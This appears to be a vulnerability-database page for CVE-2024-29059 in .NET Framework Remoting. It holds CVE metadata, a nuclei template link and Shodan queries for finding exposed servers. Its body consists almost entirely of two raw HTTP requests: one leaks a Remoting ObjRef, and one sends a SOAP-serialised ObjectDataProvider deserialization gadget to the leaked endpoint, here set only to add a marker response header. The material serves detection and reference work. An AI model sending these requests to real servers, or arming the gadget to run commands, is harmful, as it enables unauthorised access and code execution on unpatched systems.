---
layout: post
cve_id: CVE-2024-29059
title: .NET Framework - Leaking ObjRefs via HTTP .NET Remoting
pcap: true
pcap_path: /pcaps/2024/CVE-2024-29059.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-29059.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,DhiyaneshDk,pdresearch
severity: high
impact: 'Attackers can exploit leaked ObjRefs to access remote objects via .NET Remoting,
  potentially gaining unauthorized access to application data.

  '
remediation: 'Apply security patches for .NET Framework addressing CVE-2024-29059.

  '
reference:
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29059
- https://code-white.com/blog/leaking-objrefs-to-exploit-http-dotnet-remoting/
- https://github.com/codewhitesec/HttpRemotingObjRefLeak
- https://github.com/NaInSec/CVE-LIST
- https://github.com/fkie-cad/nvd-json-data-feeds
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2024-29059
  cwe-id: CWE-209
  epss-score: 0.93848
  epss-percentile: 0.99858
  cpe: cpe:2.3:a:microsoft:.net_framework:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: microsoft
  product: .net_framework
  shodan-query:
  - 'Server: MS .NET Remoting'
  - 'server: ms .net remoting'
tags:
- cve
- cve2024
- dotnet
- microsoft
- remoting
- deserialization
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
.NET Framework Information Disclosure Vulnerability

## üåê HTTP Request
```nohighlight
GET /RemoteApplicationMetadata.rem?wsdl HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Connection: close
Content-Type: text/xml
__RequestVerb: POST
Accept-Encoding: gzip
```

```nohighlight
POST /N12vXW HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
Connection: close
Content-Length: 1729
Content-Type: text/xml
SOAPAction: ""
Accept-Encoding: gzip

<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<a1:TextFormattingRunProperties id="ref-1" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35">
<ForegroundBrush id="ref-3">&#60;ObjectDataProvider MethodName=&#34;AddHeader&#34;
  xmlns=&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34;
  xmlns:x=&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34;
  xmlns:System=&#34;clr-namespace:System;assembly=mscorlib&#34;
  xmlns:System.Web=&#34;clr-namespace:System.Web;assembly=System.Web&#34;&#62;&#60;ObjectDataProvider.ObjectInstance&#62;&#60;ObjectDataProvider MethodName=&#34;get_Response&#34;&#62;&#60;ObjectDataProvider.ObjectInstance&#62;
  &#60;ObjectDataProvider ObjectType=&#34;{x:Type System.Web:HttpContext}&#34; MethodName=&#34;get_Current&#34; /&#62;
  &#60;/ObjectDataProvider.ObjectInstance&#62;
  &#60;/ObjectDataProvider&#62;
  &#60;/ObjectDataProvider.ObjectInstance&#62;
  &#60;ObjectDataProvider.MethodParameters&#62;
  &#60;System:String&#62;X-Vuln-Test&#60;/System:String&#62;
  &#60;System:String&#62;38Ekwq9yH4pET3lEV0a3wz5KwA2&#60;/System:String&#62;
  &#60;/ObjectDataProvider.MethodParameters&#62;
&#60;/ObjectDataProvider&#62;</ForegroundBrush>
</a1:TextFormattingRunProperties>
</SOAP-ENV:Envelope>
```

